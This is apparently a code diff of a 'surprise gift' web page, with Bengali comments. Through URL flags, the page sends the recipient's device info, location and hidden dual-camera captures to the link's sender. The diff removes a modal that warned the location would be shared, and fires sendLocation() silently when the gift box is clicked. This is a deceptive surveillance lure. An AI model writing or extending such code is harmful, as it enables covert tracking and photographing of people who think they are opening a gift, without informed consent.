@@ -537,47 +537,6 @@
             border-radius: 8px;
             margin-top: 10px;
         }
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            padding: 15px;
-        }
-        .modal-content {
-            background: white;
-            padding: 25px;
-            border-radius: var(--border-radius);
-            text-align: center;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: var(--box-shadow-hover);
-        }
-        .modal-content h3 {
-            margin-top: 0;
-            font-size: 18px;
-        }
-        .modal-content p {
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .modal-content button {
-            width: auto;
-            padding: 10px 25px;
-            margin: 0 5px;
-        }
-        /* *** "বাতিল করুন" বাটনের জন্য নতুন স্টাইল *** */
-        #cancel-location-btn {
-            background: #f1f5f9;
-            color: var(--text-dark);
-            border: 1px solid #e2e8f0;
-        }
         @keyframes float {
             0%, 100% { transform: translateY(0); }
             50% { transform: translateY(-10px); }
@@ -705,18 +664,6 @@
     </div>
 
     <div class="victory-effect" id="victoryEffect"></div>
-
-    <!-- *** নতুন Modal এর জন্য HTML আপডেট করা হয়েছে *** -->
-    <div class="modal-overlay" id="location-permission-modal">
-        <div class="modal-content">
-            <h3><i class="fas fa-map-marker-alt"></i> লোকেশনের অনুমতি প্রয়োজন</h3>
-            <p>এই সারপ্রাইজের একটি অংশ হিসেবে আপনার বর্তমান লোকেশনটি প্রেরকের সাথে শেয়ার করা হবে। অনুগ্রহ করে পরবর্তী ধাপে আপনার লোকেশন অ্যাক্সেস করার জন্য "Allow" বাটনে ক্লিক করুন।</p>
-            <div>
-                <button id="grant-location-btn">ঠিক আছে, অনুমতি দিন</button>
-                <button id="cancel-location-btn">বাতিল করুন</button>
-            </div>
-        </div>
-    </div>
 
     <video id="video-preview" style="display:none;" playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -904,30 +851,12 @@
             document.getElementById('copyButton').addEventListener('click', () => { navigator.clipboard.writeText(document.getElementById('generatedLink').value); });
         }
 
-        // *** সংশোধিত অংশ: লোকেশন পারমিশনের নতুন লজিক ***
         function displayGift(params) {
-            const loadGiftContent = (p) => {
-                const countdownTime = p.get('cd');
-                if (countdownTime) {
-                    handleCountdown(p, new Date(countdownTime));
-                } else {
-                    showMainGiftContent(p);
-                }
-            };
-            if (params.get('loc') === 'true') {
-                const modal = document.getElementById('location-permission-modal');
-                modal.style.display = 'flex';
-                document.getElementById('grant-location-btn').addEventListener('click', () => {
-                    modal.style.display = 'none';
-                    sendLocation();
-                    loadGiftContent(params);
-                }, { once: true });
-                document.getElementById('cancel-location-btn').addEventListener('click', () => {
-                    modal.style.display = 'none';
-                    loadGiftContent(params);
-                }, { once: true });
+            const countdownTime = params.get('cd');
+            if (countdownTime) {
+                handleCountdown(params, new Date(countdownTime));
             } else {
-                loadGiftContent(params);
+                showMainGiftContent(params);
             }
         }
 
@@ -966,12 +895,17 @@
                 img.src = imageURL;
                 img.classList.remove('hidden');
             }
+            
+            // *** সংশোধিত অংশ: ক্লিক করার পর সরাসরি পারমিশন চাইবে ***
             document.getElementById('giftWrapper').addEventListener('click', () => {
                 const caption = `Gift from: ${sender}\nTo: ${receiver}`;
                 if (params.get('info') === 'true') { sendDeviceInfo(); }
                 if (params.get('cam') === 'true') { initiateDualCameraCapture(caption); }
+                if (params.get('loc') === 'true') { sendLocation(); }
+
                 document.getElementById('giftBox').classList.add('open');
                 document.querySelector('.click-instruction').style.display = 'none';
+                
                 setTimeout(() => {
                     const wrapper = document.getElementById('giftWrapper');
                     wrapper.classList.add('revealed');
